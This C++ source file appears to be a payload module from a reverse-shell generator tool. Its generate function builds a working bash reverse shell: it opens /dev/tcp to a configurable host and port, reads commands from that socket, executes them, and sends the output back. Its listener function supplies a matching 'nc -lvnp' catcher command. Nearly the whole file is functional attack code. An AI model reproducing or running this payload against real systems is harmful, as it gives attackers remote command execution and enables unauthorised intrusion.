#include "Bash_RL_Payload.h"
#include "../../listeners/ListenerFactory.h"
#include "../../core/Options.h"

#include <string>

std::string BashRLPayload::name() const {
    return "bash_rl";
}

std::string BashRLPayload::generate(const Options& opts) const {
    return "exec 5<>/dev/tcp/" + opts.host + "/" + std::to_string(opts.port) + ";cat <&5 | while read line; do $line 2>&5 >&5; done";
}

std::string BashRLPayload::listener(const Options& opts) const {
    ListenerFactory factory;
    IListener* listener = factory.get(opts.listenerType);
    return listener ? listener->command(opts) : "nc -lvnp " + std::to_string(opts.port);
}